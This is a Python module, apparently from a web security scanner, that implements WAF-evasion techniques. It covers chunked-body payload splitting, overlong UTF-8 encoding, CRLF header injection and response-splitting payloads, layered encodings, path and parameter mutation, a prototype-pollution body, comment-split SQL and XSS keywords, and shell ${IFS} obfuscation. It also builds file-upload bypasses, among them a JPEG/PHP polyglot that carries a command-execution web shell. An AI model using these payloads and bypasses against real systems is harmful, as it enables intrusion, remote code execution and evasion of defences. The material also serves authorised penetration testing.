"""
websecure.core.evasion
-----------------------
Advanced WAF evasion engine.

Provides self-contained primitives that are used by:
  - WAFBypassAdapter.send()   (waf_bypass.py)
  - BypassStrategyEngine      (waf_bypass.py)
  - Individual scanners       (request_smuggling, crlf_injection, …)

Components
----------
  ChunkedBodyBuilder    — variable-chunk-size body encoding for chunk-boundary
                          payload splitting
  OverlongUTF8Encoder   — generates non-canonical (overlong) UTF-8 byte sequences
                          that legacy parsers accept but WAFs miss
  CRLFInjector          — CRLF injection payload library for header/response
                          splitting tests
  EncodingChain         — multi-technique encoding combinations (url+html, double-url, …)
  PathMutator           — URL path obfuscation (double-slash, dot-segment, semicolon …)
  ParamFragmentor       — HTTP parameter fragmentation to split payloads across keys
  JSONUnicodeEscaper    — unicode-escape JSON string values to bypass keyword signatures
  HTTP2EvasionHelper    — pseudo-header reordering and header-case tricks for HTTP/2
  HeaderCasingMutator   — header name case variants (lower/UPPER/Title/aLtErNaTiNg)
  CommentInjector       — SQL/JS/HTML/shell comment injection for keyword splitting
  UnicodeConfuser       — homoglyph substitutions, fullwidth, zero-width-insert
  MimeTypeConfuser      — MIME/extension confusion and polyglot files for upload bypass

All classes are stateless (or cheaply re-created); module-level singletons provide
a convenient call-through API.
"""
from __future__ import annotations

import logging
import io
import random
import re
import urllib.parse as _up
from itertools import permutations
from typing import Dict, Iterable, List, Optional, Tuple

_logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------------
# ChunkedBodyBuilder
# -----------------------------------------------------------------------------

class ChunkedBodyBuilder:
    """
    Build a valid chunked-transfer-encoded body from a payload.

    WAF evasion value
    -----------------
    • Splits payload across arbitrary chunk boundaries — WAFs that only inspect
      the first chunk will miss signatures spanning two chunks.
    • Variable chunk sizes defeat static pattern-matching rules.
    • Optional chunk-extensions (;k=v) confuse some WAF parsers that fail to
      skip the extension field.
    """

    def build(
        self,
        payload: bytes | str,
        *,
        min_chunk: int = 1,
        max_chunk: int = 8,
        add_extensions: bool = False,
    ) -> bytes:
        """
        Encode *payload* as an RFC 7230 chunked body.

        Returns the complete wire-format chunked body ending with ``0\\r\\n\\r\\n``.

        Args:
            payload:        Bytes or str to encode.
            min_chunk:      Minimum random chunk size (bytes).
            max_chunk:      Maximum random chunk size (bytes).
            add_extensions: Append random chunk-extensions to each size line.
        """
        if isinstance(payload, str):
            payload = payload.encode("utf-8", errors="replace")

        # P7 fix: random.randint(a, b) raises ValueError when a > b.
        # waf_bypass.py reads _chunk_min/_chunk_max from session attrs — a mis-
        # configured session with min > max would crash here. Swap if inverted.
        if min_chunk > max_chunk:
            min_chunk, max_chunk = max_chunk, min_chunk

        out = io.BytesIO()
        offset = 0
        while offset < len(payload):
            size  = random.randint(min_chunk, max_chunk)
            chunk = payload[offset : offset + size]
            offset += size

            size_hex = format(len(chunk), "x")
            if add_extensions:
                ext  = f";x{random.randint(0, 0xFFFF):04x}={random.randint(0, 0xFFFF):04x}"
                line = (size_hex + ext + "\r\n").encode()
            else:
                line = (size_hex + "\r\n").encode()

            out.write(line)
            out.write(chunk)
            out.write(b"\r\n")

        out.write(b"0\r\n\r\n")
        return out.getvalue()

    def build_split_at(
        self,
        payload: bytes | str,
        split_points: List[int],
    ) -> bytes:
        """
        Build a chunked body with precise byte-offset split points.

        Useful for splitting a known WAF signature across chunk boundaries::

            # "UNION" detected by WAF -> split so "UNI" is chunk 1, "ON" is chunk 2
            build_split_at(b"UNION SELECT 1", split_points=[3])
        """
        if isinstance(payload, str):
            payload = payload.encode("utf-8", errors="replace")

        out  = io.BytesIO()
        prev = 0
        for pt in sorted(split_points):
            chunk = payload[prev:pt]
            if chunk:
                out.write(f"{len(chunk):x}\r\n".encode())
                out.write(chunk)
                out.write(b"\r\n")
            prev = pt

        rem = payload[prev:]
        if rem:
            out.write(f"{len(rem):x}\r\n".encode())
            out.write(rem)
            out.write(b"\r\n")

        out.write(b"0\r\n\r\n")
        return out.getvalue()

    def small_chunks(self, payload: bytes | str) -> bytes:
        """Extreme 1-byte chunk encoding — maximum WAF confusion."""
        return self.build(payload, min_chunk=1, max_chunk=1, add_extensions=True)


# -----------------------------------------------------------------------------
# OverlongUTF8Encoder
# -----------------------------------------------------------------------------

class OverlongUTF8Encoder:
    """
    Generate non-canonical (overlong) UTF-8 byte sequences.

    RFC 3629 §3 forbids overlong encodings, but many legacy parsers accept them.
    WAFs that rely on exact byte patterns will miss overlongly-encoded payloads.

    Encoding examples for ASCII 'a' (U+0061 = 0x61):
        Normal  1-byte : 0x61
        Overlong 2-byte: 0xC1 0xA1
        Overlong 3-byte: 0xE0 0x81 0xA1
    """

    def encode_char_2byte(self, codepoint: int) -> bytes:
        """2-byte overlong for any code point < 0x80."""
        b1 = 0xC0 | ((codepoint >> 6) & 0x1F)
        b2 = 0x80 | (codepoint & 0x3F)
        return bytes([b1, b2])

    def encode_char_3byte(self, codepoint: int) -> bytes:
        """3-byte overlong for any code point < 0x0800."""
        b1 = 0xE0 | ((codepoint >> 12) & 0x0F)
        b2 = 0x80 | ((codepoint >> 6) & 0x3F)
        b3 = 0x80 | (codepoint & 0x3F)
        return bytes([b1, b2, b3])

    def encode_string(self, text: str, *, mode: str = "2byte") -> bytes:
        """
        Overlong-encode an entire string.

        mode:
            ``'2byte'``  — 2-byte overlong for all ASCII characters
            ``'3byte'``  — 3-byte overlong for all ASCII characters
            ``'mixed'``  — random mix of 2-byte and 3-byte per character
        """
        out = io.BytesIO()
        for ch in text:
            cp = ord(ch)
            if cp < 0x80:
                if mode == "2byte" or (mode == "mixed" and random.random() < 0.5):
                    out.write(self.encode_char_2byte(cp))
                else:
                    out.write(self.encode_char_3byte(cp))
            else:
                out.write(ch.encode("utf-8"))
        return out.getvalue()

    def url_encode_overlong(self, text: str) -> str:
        """
        Return a percent-encoded overlong UTF-8 representation.

        Example: '/' (0x2F) -> ``%C0%AF``  (Cloudflare/old IIS bypass)
        """
        result = []
        for ch in text:
            cp = ord(ch)
            if cp < 0x80:
                ob = self.encode_char_2byte(cp)
                result.append("".join(f"%{b:02X}" for b in ob))
            else:
                result.append(_up.quote(ch, safe=""))
        return "".join(result)

    def partial_encode(self, text: str, chars: str = "/<>\"'()") -> str:
        """
        Overlong-encode only the characters in *chars*; leave the rest normal.
        Useful for partial obfuscation that still looks like a valid URL.
        """
        result = []
        for ch in text:
            if ch in chars and ord(ch) < 0x80:
                ob = self.encode_char_2byte(ord(ch))
                result.append("".join(f"%{b:02X}" for b in ob))
            else:
                result.append(ch)
        return "".join(result)


# -----------------------------------------------------------------------------
# CRLFInjector
# -----------------------------------------------------------------------------

class CRLFInjector:
    """
    Generate CRLF injection payload variants.

    Covers URL-encoded, double-encoded, unicode-encoded, Nginx-specific,
    and combined sequences — suitable for both automated injection and
    manual confirmation.

    Attack targets:
      • URL parameter values  (Location redirect injection)
      • HTTP response headers (Set-Cookie, custom header injection)
      • HTTP response body    (response splitting / XSS via header injection)
    """

    # Ordered from most likely to succeed to most exotic
    CRLF_SEQS: List[str] = [
        "%0d%0a",           # Standard URL-encoded CRLF
        "%0a",              # LF only (accepted by many servers)
        "%0d",              # CR only
        "%0a%0d",           # Reversed order
        "%0d%0a%09",        # CRLF + TAB (header folding trick)
        "%23%0d%0a",        # # + CRLF (fragment-based)
        "%E5%98%8A%E5%98%8D",  # Unicode fullwidth CRLF (U+560A U+560D)
        "%C0%8A",           # Overlong LF (Nginx/old Apache)
        "%C0%8D",           # Overlong CR
        "%250d%250a",       # Double-URL-encoded
        "%2F%2F%0d%0a",     # // + CRLF
        "%3F%0d%0a",        # ? + CRLF
        "\\r\\n",           # Escaped literal (template injection contexts)
        "\r\n",             # Literal (raw socket / template contexts)
    ]

    def header_inject_payloads(
        self,
        inject_header: str = "Set-Cookie",
        inject_value: str  = "injected=1; path=/",
        *,
        prefix: str = "",
    ) -> List[str]:
        """
        Generate URL-parameter values that inject *inject_header* after CRLF.

        Each returned string is meant to be used as the **value** of a URL
        parameter that is reflected into a Location or similar header::

            ?url=<prefix><crlf_seq><inject_header>: <inject_value>
        """
        safe_value = _up.quote(inject_value, safe=": ;=/")
        payloads   = []
        for seq in self.CRLF_SEQS:
            payloads.append(f"{prefix}{seq}{inject_header}: {safe_value}")
        return payloads

    def response_split_payloads(
        self,
        *,
        body: str = "<script>alert(document.domain)</script>",
    ) -> List[str]:
        """
        HTTP Response Splitting payloads.
        Injects a complete fake HTTP/1.1 200 response after the CRLF pair.
        """
        payloads = []
        fake = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/html\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )
        for double_seq in ["%0d%0a%0d%0a", "%0a%0a", "\r\n\r\n"]:
            payloads.append(double_seq + fake)
        return payloads

    def cookie_inject_payloads(
        self,
        cookie_name: str  = "admin",
        cookie_value: str = "1",
    ) -> List[str]:
        """Inject a forged cookie via CRLF header injection."""
        return self.header_inject_payloads(
            "Set-Cookie",
            f"{cookie_name}={cookie_value}; path=/; HttpOnly",
        )

    def all_variants(self, base_value: str = "test") -> List[str]:
        """
        Return all CRLF injection variants for a base value.
        Includes single-line injections and double-CRLF body injections.
        """
        variants: List[str] = []
        for seq in self.CRLF_SEQS:
            variants.append(f"{base_value}{seq}X-Injected: 1")
        variants.extend(self.response_split_payloads())
        return variants


# -----------------------------------------------------------------------------
# EncodingChain
# -----------------------------------------------------------------------------

class EncodingChain:
    """
    Multi-technique encoding pipeline.

    Chains multiple passes to create layered payloads that confuse WAFs
    parsing at one encoding layer while backends decode all layers.

    Example::

        EncodingChain().apply("a", ["html_entity", "url"])
        # "a" -> "&#97;" -> "%26%2397%3B"   (every char is encoded at each layer)
    """

    _TECHNIQUES = frozenset([
        "url", "double_url", "html_entity", "html_hex",
        "unicode_escape", "json_unicode", "hex", "base64",
        "overlong_utf8_url", "case_random",
    ])

    def apply(self, payload: str, techniques: List[str]) -> str:
        """Apply *techniques* in sequence to *payload*."""
        result = payload
        for tech in techniques:
            result = self._apply_one(result, tech)
        return result

    def _apply_one(self, s: str, tech: str) -> str:
        if tech == "url":
            return _up.quote(s, safe="")
        if tech == "double_url":
            return _up.quote(_up.quote(s, safe=""), safe="")
        if tech == "html_entity":
            return "".join(f"&#{ord(c)};" for c in s)
        if tech == "html_hex":
            return "".join(f"&#x{ord(c):x};" for c in s)
        if tech == "unicode_escape":
            return "".join(f"\\u{ord(c):04x}" for c in s)
        if tech == "json_unicode":
            return "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in s)
        if tech == "hex":
            return s.encode("utf-8").hex()
        if tech == "base64":
            import base64 as _b64
            return _b64.b64encode(s.encode("utf-8")).decode("ascii")
        if tech == "overlong_utf8_url":
            return OverlongUTF8Encoder().url_encode_overlong(s)
        if tech == "case_random":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
        return s  # unknown technique -> pass through

    def generate_variants(self, payload: str, depth: int = 2) -> List[str]:
        """
        Generate unique encoding variants up to *depth* encoding layers.
        Returns deduplicated list sorted by length.
        """
        single = [
            "url", "double_url", "html_entity", "html_hex",
            "unicode_escape", "overlong_utf8_url",
        ]
        variants: set[str] = set()

        for t in single:
            try:
                variants.add(self.apply(payload, [t]))
            except Exception as exc:
                _logger.debug(f"[core.evasion] {type(exc).__name__}: {exc!r}")

        if depth >= 2:
            for t1 in single:
                for t2 in single:
                    if t1 != t2:
                        try:
                            variants.add(self.apply(payload, [t1, t2]))
                        except Exception as exc:
                            _logger.debug(f"[core.evasion] {type(exc).__name__}: {exc!r}")

        return sorted(variants, key=len)


# -----------------------------------------------------------------------------
# PathMutator
# -----------------------------------------------------------------------------

class PathMutator:
    """
    URL path obfuscation.

    Generates structural variants that normalize to the same resource
    on the backend while confusing WAF path-normalization rules.
    """

    def mutate(self, path: str) -> List[str]:
        """Return a deduplicated list of obfuscated path variants."""
        variants: List[str] = [path]

        # Double-slash prefix
        variants.append("//" + path.lstrip("/"))

        # Dot-segment insertion (/./ normalizes to /)
        segs   = path.lstrip("/").split("/")
        dotted = "/".join(f"./{s}" if s else s for s in segs)
        variants.append("/" + dotted)

        # Current-dir prefix
        variants.append("/." + path)

        # Semicolon path parameter
        variants.append(path.rstrip("/") + ";websec=1")

        # Null-byte before extension
        last = path.split("/")[-1]
        if "." in last:
            # P7 fix: path.replace(".", "%00.", 1) replaced the first "." in the
            # entire path string, not the extension dot in the last segment.
            # For /api.v2/upload.php it produced /api%00.v2/upload.php instead of
            # /api.v2/upload%00.php. Use rfind to target the last dot in the path.
            last_dot = path.rfind(".")
            variants.append(path[:last_dot] + "%00" + path[last_dot:])

        # Partial slash URL-encoding (%2F)
        slash_count = path.count("/")
        if slash_count > 1:
            variants.append(path.replace("/", "%2F", slash_count - 1))

        # Mixed case
        variants.append(
            "".join(c.upper() if i % 2 == 0 and c.isalpha() else c for i, c in enumerate(path))
        )

        # Tab in path (some WAFs skip; servers normalize)
        variants.append(path.replace("/", "/%09", 1))

        # Trailing-dot segment (Windows IIS normalizes /admin. -> /admin)
        variants.append(path.rstrip("/") + ".")

        # Unicode fullwidth slash
        variants.append(path.replace("/", "\uff0f"))

        return list(dict.fromkeys(variants))  # deduplicate, preserve order


# -----------------------------------------------------------------------------
# ParamFragmentor
# -----------------------------------------------------------------------------

class ParamFragmentor:
    """
    HTTP parameter fragmentation.

    Some WAF parsers inspect only the *first* occurrence of a parameter while
    backend frameworks concatenate (or keep last) duplicates.  Splitting a
    payload across multiple occurrences of the same key confuses signature
    matching.

    Example::

        fragment("cmd", "SELECT+*+FROM+users", n=2)
        -> [("cmd", "SELECT+*"), ("cmd", "+FROM+users")]
    """

    def fragment(self, name: str, payload: str, n: int = 2) -> List[Tuple[str, str]]:
        """Split *payload* into *n* equal parts, each with the same *name* key."""
        # P7 fix: n <= 0 caused ZeroDivisionError in len(payload) // n.
        n = max(1, n)
        size   = max(1, len(payload) // n)
        parts: List[Tuple[str, str]] = []
        for i in range(0, len(payload), size):
            parts.append((name, payload[i : i + size]))
        return parts

    def hpp_duplicate(
        self,
        params: Dict[str, str],
        *,
        separator: str = "&",
    ) -> List[Tuple[str, str]]:
        """
        Build an HPP-poisoned parameter list.

        Each original parameter gets an extra duplicate whose value ends with
        ``&x=1`` to attempt parser confusion.
        """
        out: List[Tuple[str, str]] = []
        for k, v in params.items():
            out.append((k, v))
            out.append((k, v + separator + "x=1"))
        return out

    def nested_json_keys(self, key: str, value: str = "1") -> Dict:
        """
        Build a nested JSON object exploiting prototype pollution via key fragmentation.

        Returns a Python dict suitable for use as a JSON request body.
        """
        return {"__proto__": {key: value}}


# -----------------------------------------------------------------------------
# JSONUnicodeEscaper
# -----------------------------------------------------------------------------

class JSONUnicodeEscaper:
    """
    Escape JSON string values using ``\\uXXXX`` sequences.

    WAFs that perform keyword matching on raw JSON bodies will miss
    ``"\\u0073elect"`` (= ``"select"``), while virtually all JSON parsers
    decode it correctly.
    """

    def escape_value(self, value: str, *, partial: bool = False) -> str:
        """
        Escape ASCII characters in *value* as JSON unicode escapes.

        partial=True escapes every other character (less conspicuous).
        """
        result = []
        for i, ch in enumerate(value):
            if ord(ch) < 128 and (not partial or i % 2 == 0):
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    def escape_json(self, payload: str, *, partial: bool = False) -> str:
        """
        Given a raw JSON string, unicode-escape the contents of all string values.

        Only string *values* are escaped (not keys) to keep structure valid.
        """
        def _replacer(m: re.Match) -> str:
            inner   = m.group(1)
            escaped = self.escape_value(inner, partial=partial)
            return f'"{escaped}"'

        # Match JSON string values (simple heuristic — does not handle escaped quotes)
        return re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', _replacer, payload)

    def escape_keywords(self, json_str: str, keywords: Iterable[str]) -> str:
        """
        Escape only the listed *keywords* inside all string values of a JSON body.

        More surgical than full escaping — keeps the payload natural-looking.
        """
        result = json_str
        for kw in keywords:
            escaped = self.escape_value(kw)
            result  = result.replace(f'"{kw}"', f'"{escaped}"')
            result  = result.replace(f': {kw}',  f': {escaped}')
        return result


# -----------------------------------------------------------------------------
# HTTP/2 Evasion Helper
# -----------------------------------------------------------------------------

class HTTP2EvasionHelper:
    """
    HTTP/2 pseudo-header and header-name evasion techniques.

    HTTP/2 WAFs parse pseudo-headers (:method, :path, :scheme, :authority)
    and the header name format (case-folded).  Reordering pseudo-headers or
    injecting unusual header-name casing can bypass pattern rules.

    Note: Actual HTTP/2 frame manipulation requires a low-level HTTP/2
    client (httpx with http2=True, or curl_cffi).  This helper produces
    the configuration dicts / header-name variants needed by those clients.
    """

    # Standard pseudo-header order per HTTP/2 spec
    _STANDARD_ORDER = [":method", ":path", ":scheme", ":authority"]

    def pseudo_header_permutations(self) -> List[List[str]]:
        """
        Return all 24 permutations of the 4 standard HTTP/2 pseudo-headers.
        Each permutation is a distinct ordering that some WAFs may not expect.
        """
        return [list(p) for p in permutations(self._STANDARD_ORDER)]

    def random_pseudo_order(self) -> List[str]:
        """Return a random pseudo-header order."""
        order = list(self._STANDARD_ORDER)
        random.shuffle(order)
        return order

    def obfuscated_header_names(self, headers: Dict[str, str]) -> Dict[str, str]:
        """
        Return *headers* with some names converted to non-standard casing.

        HTTP/2 requires lowercase header names; some WAFs inspect casing
        before the HTTP/2 layer normalizes it.

        Example: ``content-type`` -> ``Content-Type`` (which httpx will
        lower-case on the wire, but curl_cffi may preserve).
        """
        result: Dict[str, str] = {}
        for k, v in headers.items():
            if random.random() < 0.4:
                # Title-case — will be normalized by compliant clients
                result[k.title()] = v
            else:
                result[k] = v
        return result

    def build_http2_headers(
        self,
        method: str,
        path: str,
        authority: str,
        extra: Optional[Dict[str, str]] = None,
        *,
        randomize_order: bool = True,
    ) -> List[Tuple[str, str]]:
        """
        Build an ordered list of (header-name, value) tuples for HTTP/2.

        The pseudo-headers are placed first in either standard or random order,
        followed by regular headers.  This list format is suitable for
        low-level HTTP/2 clients that accept explicit header sequences.
        """
        pseudo = {
            ":method":    method.upper(),
            ":path":      path,
            ":scheme":    "https",
            ":authority": authority,
        }
        order = (
            self.random_pseudo_order()
            if randomize_order
            else self._STANDARD_ORDER
        )
        result: List[Tuple[str, str]] = [(h, pseudo[h]) for h in order]

        if extra:
            for k, v in extra.items():
                result.append((k.lower(), v))

        return result


# -----------------------------------------------------------------------------
# HeaderCasingMutator
# -----------------------------------------------------------------------------

class HeaderCasingMutator:
    """
    Generate WAF-bypassing HTTP header name casing variants.

    RFC 7230 states header names are case-insensitive; most backends honour
    this.  WAFs that normalize only well-known casing may miss non-standard
    variants.

    Techniques: lower-case, UPPER-CASE, Title-Case, aLtErNaTiNg,
                single-char-flip, hyphen-stripped.
    """

    def variants(self, header_name: str) -> List[str]:
        """Return a deduplicated list of casing variants for *header_name*."""
        seen: set = set()
        out: List[str] = []

        def _add(s: str) -> None:
            if s not in seen:
                seen.add(s)
                out.append(s)

        _add(header_name)
        _add(header_name.lower())
        _add(header_name.upper())
        _add(header_name.title())
        _add(self._alternating(header_name))
        _add(self._flip_one(header_name))
        _add(header_name.replace("-", ""))  # hyphen-stripped (WAF normalization bugs)

        return out

    @staticmethod
    def _alternating(s: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    @staticmethod
    def _flip_one(s: str) -> str:
        indices = [i for i, c in enumerate(s) if c.isalpha()]
        if not indices:
            return s
        idx = random.choice(indices)
        lst = list(s)
        lst[idx] = lst[idx].swapcase()
        return "".join(lst)

    def mutate_headers(self, headers: Dict[str, str]) -> List[Dict[str, str]]:
        """
        Return header dicts where each dict has one header name replaced with
        a casing variant.  Useful for systematic fuzzing.
        """
        results: List[Dict[str, str]] = []
        for key in headers:
            for variant in self.variants(key):
                if variant != key:
                    mutated = dict(headers)
                    del mutated[key]
                    mutated[variant] = headers[key]
                    results.append(mutated)
        return results


# -----------------------------------------------------------------------------
# CommentInjector
# -----------------------------------------------------------------------------

class CommentInjector:
    """
    Inject SQL / JavaScript / HTML / shell comments to split WAF keywords.

    WAFs matching ``UNION SELECT`` in raw input miss ``UNION/**/SELECT``.
    Supports SQL, JS, HTML, and shell comment styles.
    """

    _SQL_COMMENTS  = ["/**/", "/*!*/", "/*--*/", "/*#*/"]
    _JS_COMMENTS   = ["/* */", "//\n"]
    _HTML_COMMENTS = ["<!---->", "<!-- -->"]

    def split_keyword_sql(self, keyword: str) -> List[str]:
        """Return SQL-comment-split variants of *keyword* at every split position."""
        variants: List[str] = []
        for comment in self._SQL_COMMENTS:
            for pos in range(1, len(keyword)):
                variants.append(keyword[:pos] + comment + keyword[pos:])
        return list(dict.fromkeys(variants))

    def inline_comment_sql(self, sql: str, keywords: Iterable[str]) -> List[str]:
        """Return versions of *sql* with each keyword split by an inline SQL comment."""
        results = []
        for kw in keywords:
            idx = sql.upper().find(kw.upper())
            if idx == -1:
                continue
            mid = len(kw) // 2
            variant = (
                sql[:idx]
                + sql[idx : idx + mid]
                + "/**/"
                + sql[idx + mid : idx + len(kw)]
                + sql[idx + len(kw) :]
            )
            results.append(variant)
        return results

    def whitespace_variants_sql(self, sql: str) -> List[str]:
        """Replace spaces with comment-based whitespace substitutes."""
        return [sql.replace(" ", sub) for sub in ["/**/", "\t", "\n", "\r\n", "/*!*/"]]

    def html_comment_xss(self, payload: str) -> List[str]:
        """Insert HTML comments inside XSS tag keywords to evade pattern matching."""
        variants = []
        for tag in ["script", "img", "svg", "iframe", "body", "input"]:
            if tag in payload.lower():
                mid = len(tag) // 2
                split_tag = tag[:mid] + "<!---->" + tag[mid:]
                variants.append(payload.lower().replace(tag, split_tag, 1))
        return variants

    def shell_comment_injection(self, cmd: str) -> List[str]:
        """Inject shell IFS/comment tokens to split command whitespace."""
        return [
            cmd.replace(" ", " #\\\n"),   # hash-newline continuation
            cmd.replace(" ", "${IFS}"),   # ${IFS} form
            cmd.replace(" ", "$IFS"),     # short form
            cmd.replace(" ", "\t"),       # tab separator
        ]


# -----------------------------------------------------------------------------
# UnicodeConfuser
# -----------------------------------------------------------------------------

class UnicodeConfuser:
    """
    Homoglyph substitutions, fullwidth Unicode, and normalization attacks.

    WAFs operating on raw bytes miss visually-identical Unicode characters
    from other blocks that normalize to the original under NFC/NFKC.

    Techniques: fullwidth ASCII, homoglyphs (Cyrillic/Greek), zero-width
                character insertion, Unicode tag block encoding.
    """

    _HOMOGLYPHS: Dict[str, List[str]] = {
        "a": ["а", "ɑ", "α"],    # Cyrillic а / Latin alpha / Greek alpha
        "e": ["е", "ε", "ë"],
        "i": ["і", "ι", "ï"],
        "o": ["о", "ο", "ö"],
        "p": ["р", "ρ"],
        "c": ["с", "ϲ"],
        "x": ["х", "χ"],
        "s": ["ѕ", "ș"],
        "/": ["∕", "⁄", "⧸"],   # division / fraction / big slash
        ".": ["․", "﹒"],             # one-dot leader / small full stop
    }

    def fullwidth(self, text: str) -> str:
        """Convert ASCII printable characters to Unicode fullwidth equivalents.
        Tek kaynak: core.mutator.to_fullwidth (önceki yerel _FULLWIDTH dict ile byte-identical)."""
        from websecure.core.mutator import to_fullwidth as _tf
        return _tf(text)

    def homoglyph_substitute(self, text: str, *, max_subs: int = 3) -> str:
        """Substitute up to *max_subs* characters with their first available homoglyph."""
        result = list(text)
        subs = 0
        for i, ch in enumerate(result):
            if subs >= max_subs:
                break
            lower = ch.lower()
            if lower in self._HOMOGLYPHS:
                result[i] = self._HOMOGLYPHS[lower][0]
                subs += 1
        return "".join(result)

    def all_homoglyph_variants(self, keyword: str) -> List[str]:
        """Return one variant per substitutable position, covering all homoglyph options."""
        variants = []
        for i, ch in enumerate(keyword):
            for glyph in self._HOMOGLYPHS.get(ch.lower(), []):
                variants.append(keyword[:i] + glyph + keyword[i + 1:])
        return list(dict.fromkeys(variants))

    def zero_width_insert(self, text: str) -> str:
        """Insert zero-width spaces between every character (breaks byte-pattern rules)."""
        return "​".join(text)

    def tag_block_encode(self, text: str) -> str:
        """Encode text using Unicode tag characters (U+E0000 block) — invisible to renderers."""
        return "".join(chr(0xE0000 + ord(c)) for c in text)

    def normalization_bypass(self, keyword: str) -> List[str]:
        """Return bypass variants using fullwidth, homoglyphs, and zero-width insertion."""
        return [
            self.fullwidth(keyword),
            self.homoglyph_substitute(keyword, max_subs=len(keyword)),
            self.zero_width_insert(keyword),
        ]


# -----------------------------------------------------------------------------
# MimeTypeConfuser
# -----------------------------------------------------------------------------

class MimeTypeConfuser:
    """
    MIME type confusion for file upload bypass.

    Generates safe-looking Content-Type values paired with dangerous extensions,
    polyglot file magic bytes, boundary tricks, and filename extension variants.
    """

    _MIME_SPOOF: List[Tuple[str, str]] = [
        ("image/jpeg",       ".php"),
        ("image/png",        ".php5"),
        ("image/gif",        ".phtml"),
        ("image/webp",       ".phar"),
        ("text/plain",       ".php"),
        ("application/pdf",  ".php"),
        ("application/zip",  ".php"),
        ("image/svg+xml",    ".svg"),   # SVG XSS vector
        ("text/csv",         ".php"),
        ("application/json", ".php"),
    ]

    _EXT_VARIANTS: Dict[str, List[str]] = {
        ".php": [
            ".php", ".php3", ".php4", ".php5", ".php7",
            ".phtml", ".phar", ".PHP", ".Php", ".phP",
            ".php%00.jpg", ".php\x00.jpg", ".php.jpg",
            ".php;.jpg", ".php/.jpg",
        ],
        ".jsp": [".jsp", ".jspx", ".jsw", ".jsv", ".jspf"],
        ".aspx": [".aspx", ".asp", ".asa", ".asax", ".ascx", ".ashx", ".asmx"],
        ".svg": [".svg", ".svgz", ".svg%00.jpg"],
    }

    def spoof_content_types(self) -> List[Tuple[str, str]]:
        """Return (safe-mime, dangerous-ext) pairs for upload bypass attempts."""
        return list(self._MIME_SPOOF)

    def extension_variants(self, ext: str) -> List[str]:
        """Return all known bypass variants for *ext*."""
        return self._EXT_VARIANTS.get(ext, [ext])

    def multipart_boundary_variants(self, boundary: str = "WebSecureBoundary") -> List[str]:
        """Return boundary string variants that may confuse WAF multipart parsers."""
        return [
            boundary,
            boundary + " ",
            '"' + boundary + '"',
            boundary.upper(),
            "----" + boundary,
            boundary + "\r\n",
        ]

    def polyglot_php_jpeg(self) -> bytes:
        """
        Polyglot that is a valid JPEG SOI header + PHP code.

        Image processors check magic bytes; PHP executes from ``<?php``.
        """
        jpeg_soi  = b"\xff\xd8\xff\xe0"
        jfif_stub = b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        php_code  = b"<?php @system($_GET['cmd']); ?>"
        return jpeg_soi + jfif_stub + php_code

    def build_upload_request(
        self,
        filename: str,
        content: bytes,
        content_type: str,
        field_name: str = "file",
        boundary: str = "WebSecureBoundary",
    ) -> Tuple[bytes, str]:
        """
        Build a raw multipart/form-data body.

        Returns ``(body_bytes, content_type_header_value)``.
        """
        header = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8")
        footer = f"\r\n--{boundary}--\r\n".encode("utf-8")
        body   = header + content + footer
        ct     = f"multipart/form-data; boundary={boundary}"
        return body, ct


# -----------------------------------------------------------------------------
# Module-level singletons + convenience functions
# -----------------------------------------------------------------------------

_chunker    = ChunkedBodyBuilder()
_overlong   = OverlongUTF8Encoder()
_crlf       = CRLFInjector()
_chain      = EncodingChain()
_path_m     = PathMutator()
_frag       = ParamFragmentor()
_json_esc   = JSONUnicodeEscaper()
_http2      = HTTP2EvasionHelper()
_hdr_casing = HeaderCasingMutator()
_comment    = CommentInjector()
_unicode    = UnicodeConfuser()
_mime       = MimeTypeConfuser()


def chunked_encode(payload: bytes | str, min_chunk: int = 1, max_chunk: int = 8) -> bytes:
    """Encode *payload* as a variable-chunk-size chunked body."""
    return _chunker.build(payload, min_chunk=min_chunk, max_chunk=max_chunk)


def chunked_small(payload: bytes | str) -> bytes:
    """1-byte chunk encoding — maximum WAF confusion."""
    return _chunker.small_chunks(payload)


def overlong_url_encode(text: str) -> str:
    """Percent-encode *text* using overlong UTF-8 sequences."""
    return _overlong.url_encode_overlong(text)


def overlong_partial(text: str, chars: str = "/<>\"'()") -> str:
    """Overlong-encode only *chars* in *text*; leave the rest normal."""
    return _overlong.partial_encode(text, chars)


def crlf_payloads(
    inject_header: str = "Set-Cookie",
    inject_value:  str = "injected=1",
    prefix:        str = "",
) -> List[str]:
    """Return all CRLF injection variants for the given header/value."""
    return _crlf.header_inject_payloads(inject_header, inject_value, prefix=prefix)


def crlf_all(base: str = "test") -> List[str]:
    """Return all CRLF variants including response-splitting payloads."""
    return _crlf.all_variants(base)


def encode_chain(payload: str, techniques: List[str]) -> str:
    """Apply encoding *techniques* in sequence to *payload*."""
    return _chain.apply(payload, techniques)


def encoding_variants(payload: str, depth: int = 2) -> List[str]:
    """Generate unique encoding variants up to *depth* layers."""
    return _chain.generate_variants(payload, depth)


def path_variants(path: str) -> List[str]:
    """Return structural obfuscation variants of *path*."""
    return _path_m.mutate(path)


def fragment_param(name: str, payload: str, n: int = 2) -> List[Tuple[str, str]]:
    """Fragment *payload* across *n* occurrences of URL parameter *name*."""
    return _frag.fragment(name, payload, n)


def json_unicode_escape(payload: str, *, partial: bool = False) -> str:
    """Unicode-escape all JSON string values in *payload*."""
    return _json_esc.escape_json(payload, partial=partial)


def http2_pseudo_orders() -> List[List[str]]:
    """Return all 24 HTTP/2 pseudo-header orderings."""
    return _http2.pseudo_header_permutations()


def http2_headers(
    method: str,
    path: str,
    authority: str,
    extra: Optional[Dict[str, str]] = None,
) -> List[Tuple[str, str]]:
    """Build an HTTP/2 header list with randomised pseudo-header order."""
    return _http2.build_http2_headers(method, path, authority, extra)


def header_casing_variants(header_name: str) -> List[str]:
    """Return WAF-bypassing casing variants for a header name."""
